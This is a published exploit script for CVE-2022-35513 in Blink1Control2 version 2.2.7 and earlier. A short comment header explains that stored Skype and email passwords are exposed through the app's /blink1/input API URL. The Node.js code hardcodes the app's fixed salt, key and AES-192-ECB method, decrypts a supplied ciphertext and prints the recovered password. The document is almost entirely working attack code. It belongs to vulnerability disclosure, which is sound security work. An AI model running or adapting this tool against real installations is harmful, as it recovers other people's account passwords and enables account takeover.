// Exploit Title: Blink1Control2 2.2.7 - Weak Password Encryption
// Date: 2022-08-12
// Exploit Author: p1ckzi
// Vendor Homepage: https://thingm.com/
// Software Link: https://github.com/todbot/Blink1Control2/releases/tag/v2.2.7
// Vulnerable Version: blink1control2 <= 2.2.7
// Tested on: Ubuntu Linux 20.04, Windows 10, Windows 11.
// CVE: CVE-2022-35513
//
// Description:
// the blink1control2 app (versions <= 2.2.7) utilises an insecure method
// of password storage which can be found by accessing the /blink1/input url
// of the api server.
// password ciphertext for skype logins and email are listed
// and can be decrypted. example usage:
// node blink1-pass-decrypt <ciphertext>
#!/usr/bin/env node
const {ArgumentParser} = require('argparse');
const simpleCrypt = require('simplecrypt');

function exploit() {
  const BANNER = '\033[36m\n\
     _     _ _       _    _\n\
    | |__ | (_)_ __ | | _/ |      _ __   __ _ ___ ___\n\
    | \'_ \\| | | \'_ \\| |/ | |_____| \'_ \\ / _` / __/ __|_____\n\
    | |_) | | | | | |   <| |_____| |_) | (_| \\__ \\__ |_____|\n\
    |_.__/|_|_|_| |_|_|\\_|_|     | .__/ \\__,_|___|___/\n\
                                 |_|\n\
         _                            _\n\
      __| | ___  ___ _ __ _   _ _ __ | |_\n\
     / _` |/ _ \\/ __| \'__| | | | \'_ \\| __|\n\
    | (_| |  __| (__| |  | |_| | |_) | |_\n\
     \\__,_|\\___|\\___|_|   \\__, | .__/ \\__|\n\
                          |___/|_|\033[39m';

  const PARSER = new ArgumentParser({
    description: 'decrypts passwords found at the /blink/input url '
    + 'of the blink1control2 api server (version <= 2.2.7 ).'
  });
  PARSER.add_argument('ciphertext', {
    help: 'encrypted password string to use', type: 'str'
  });
  let args = PARSER.parse_args();

  // supplied ciphertext is decrypted with same salt, password, and method
  // used for encryption:
  try {
    let crypt = simpleCrypt({
      salt:     'boopdeeboop',
      password: 'blink1control',
      method:   'aes-192-ecb'
    });
    let ciphertext = args.ciphertext;
    let decrypted = crypt.decrypt(ciphertext);
    console.log(BANNER);
    console.log('\033[32m[+] decrypted password:\033[39m');
    console.log(decrypted);
  }
  catch (TypeError) {
    console.log('\033[33m[!] the submitted hash was invalid.\033[39m');
  }
  finally {
    process.exit(1);
  }
}

exploit()